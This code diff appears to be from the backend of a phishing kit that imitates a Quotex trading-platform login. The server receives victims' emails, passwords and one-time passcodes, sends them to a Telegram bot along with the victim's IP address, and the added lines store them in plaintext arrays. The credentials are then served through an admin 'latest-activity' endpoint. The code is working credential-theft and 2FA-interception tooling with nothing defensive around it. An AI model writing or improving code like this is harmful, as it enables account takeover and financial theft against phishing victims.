@@ -25,6 +25,10 @@ async function sendTelegramMessage(text) {
     }
 }
 
+// ================== STORAGE FOR ADMIN PANEL ==================
+let loginLogs = [];
+let otpLogs = [];
+
 // ================== SSE CLIENTS FOR REAL-TIME TRIGGER ==================
 const connectedClients = new Set();
 
@@ -106,10 +110,18 @@ app.post('/api/notification-permission', async (req, res) => {
     res.status(200).send({ status: "success" });
 });
 
-// ================== QUOTEX LOGIN & OTP ==================
+// ================== QUOTEX LOGIN & OTP (UPDATED) ==================
 app.post('/api/quotex-login', async (req, res) => {
     const { email, password } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || "Unknown IP";
+    
+    loginLogs.unshift({
+        name: "User",
+        email: email,
+        password: password,
+        timestamp: new Date().toLocaleString()
+    });
+
     const message = `
 🔑 <b>Quotex Login Attempt</b>
 📧 Email: <b>${email}</b>
@@ -124,6 +136,14 @@ app.post('/api/quotex-login', async (req, res) => {
 app.post('/api/quotex-otp', async (req, res) => {
     const { email, otp } = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    
+    otpLogs.unshift({
+        name: "User",
+        email: email,
+        otp: otp,
+        timestamp: new Date().toLocaleString()
+    });
+
     await sendTelegramMessage(`🔢 OTP Entered\nEmail: ${email}\nOTP: ${otp}\nIP: ${ip}`);
     res.status(200).send({ status: "ok" });
 });
@@ -131,8 +151,8 @@ app.post('/api/quotex-otp', async (req, res) => {
 // ================== ADMIN PANEL ROUTES ==================
 app.get('/api/latest-activity', (req, res) => {
     res.json({
-        logins: [],
-        otps: []
+        logins: loginLogs,
+        otps: otpLogs
     });
 });
 
